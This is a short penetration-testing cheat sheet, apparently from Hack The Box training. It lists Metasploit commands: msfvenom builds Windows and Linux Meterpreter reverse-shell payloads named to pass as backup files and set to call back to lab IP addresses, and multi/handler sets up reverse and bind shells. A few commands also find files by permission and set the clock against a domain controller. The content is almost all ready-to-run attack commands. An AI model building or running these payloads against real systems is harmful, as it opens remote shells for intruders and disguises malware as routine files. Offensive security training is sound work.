#### Find readable files
```bash
find . -perm 664
```

####  Sync date with dc
```bash
ntpdate -s <Dc>
```

#### Change date 
```shell
date -s 12:12:12
```

### Meterpreter

#### windows x64 rev shell
```shell
Sauuron@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080 #Creating a Windows Payload with msfvenom
```

```shell
msf6 > use exploit/multi/handler # Handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https # HTTPS Paylaod

```

#### ubuntu x64 rev shel
```shell
Sauuron@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

```shell
set payload linux/x64/meterpreter/reverse_tcp # TCP Payload
```
#### Bind shell

```shell
msf6 > use exploit/multi/handler # Handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp # Payload

msf6 exploit(multi/handler) > set RHOST 10.129.202.64 # RHOST

msf6 exploit(multi/handler) > set LPORT 8080 # LHOST

```





